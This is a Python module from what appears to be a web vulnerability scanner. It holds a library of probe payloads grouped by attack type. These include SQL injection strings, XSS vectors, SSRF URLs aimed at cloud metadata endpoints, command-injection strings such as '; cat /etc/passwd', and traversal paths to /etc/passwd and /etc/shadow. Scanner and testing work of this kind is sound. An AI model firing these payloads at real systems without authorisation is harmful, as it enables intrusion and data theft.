"""
core/evasion/payloads.py
─────────────────────────
Central payload library for all vulnerability detectors.

Structure:
    PAYLOADS[vuln_type][technique] = [payload_list]

Detectors import their payloads from here rather than hard-coding them.
This makes it easy to add/update payloads without touching detector code.
"""

from __future__ import annotations

PAYLOADS: dict[str, dict[str, list[str]]] = {

    "sqli": {
        "error": [
            "'", '"', "';", "\" --", "') --", "' OR '1'='1",
            "' OR 1=1--", "1' ORDER BY 1--", "1 UNION SELECT NULL--",
        ],
        "boolean": [
            ("' AND 1=1--", "' AND 1=2--"),
            ("\" AND 1=1--", "\" AND 1=2--"),
        ],
        "time": [
            "' AND SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' OR pg_sleep(3)--",
            "' AND 1=1 AND SLEEP(3)--",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
    },

    "xss": {
        "reflected": [
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "</title><script>alert(1)</script>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
        ],
        "dom": [
            "location.href='javascript:alert(1)'",
            "document.write('<script>alert(1)</script>')",
        ],
        "csp_bypass": [
            "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
        ],
    },

    "ssrf": {
        "internal": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://169.254.169.254/latest/meta-data/",   # AWS
            "http://metadata.google.internal/",           # GCP
            "http://169.254.169.254/metadata/v1/",        # Azure / DigitalOcean
            "http://192.168.1.1/",
            "http://10.0.0.1/",
        ],
        "file": [
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ],
        "bypass": [
            "http://127.1/",
            "http://0177.0.0.1/",
            "http://0x7f000001/",
        ],
    },

    "rce": {
        "unix": [
            "; sleep 3",
            "| sleep 3",
            "`sleep 3`",
            "$(sleep 3)",
            "; echo WGRCE",
            "| echo WGRCE",
            "; cat /etc/passwd",
        ],
        "windows": [
            "& ping -n 3 127.0.0.1",
            "| echo WGRCE",
            "& echo WGRCE",
            "cmd /c echo WGRCE",
        ],
    },

    "directory_traversal": {
        "unix": [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "%2e%2e%2fetc%2fpasswd",
            "..%2Fetc%2Fpasswd",
        ],
        "windows": [
            "..\\windows\\win.ini",
            "..\\..\\windows\\win.ini",
            "%2e%2e%5cwindows%5cwin.ini",
        ],
        "detection_strings": [
            "root:x:",              # /etc/passwd
            "[extensions]",         # win.ini
        ],
    },

    "idor": {
        "id_values": ["0", "1", "2", "100", "999", "-1", "9999"],
        "uuid_test": ["00000000-0000-0000-0000-000000000001"],
    },

    "misconfig": {
        "required_headers": [
            "strict-transport-security",
            "x-frame-options",
            "x-content-type-options",
            "referrer-policy",
            "permissions-policy",
            "content-security-policy",
        ],
        "sensitive_paths": [
            "/.git/config",
            "/.env",
            "/phpinfo.php",
            "/server-status",
            "/actuator",
            "/actuator/env",
            "/admin",
            "/wp-admin",
            "/.well-known/security.txt",
        ],
    },
}


def get_payloads(vuln_type: str, technique: str = "all") -> list:
    """
    Retrieve payloads for a given vuln type and technique.

    Args:
        vuln_type: e.g. "sqli", "xss"
        technique: specific technique key, or "all" to get everything flat

    Returns:
        Flat list of payload strings.
    """
    vuln = PAYLOADS.get(vuln_type, {})
    if technique == "all":
        result = []
        for payloads in vuln.values():
            if isinstance(payloads, list):
                for p in payloads:
                    if isinstance(p, str):
                        result.append(p)
        return result
    return [p for p in vuln.get(technique, []) if isinstance(p, str)]
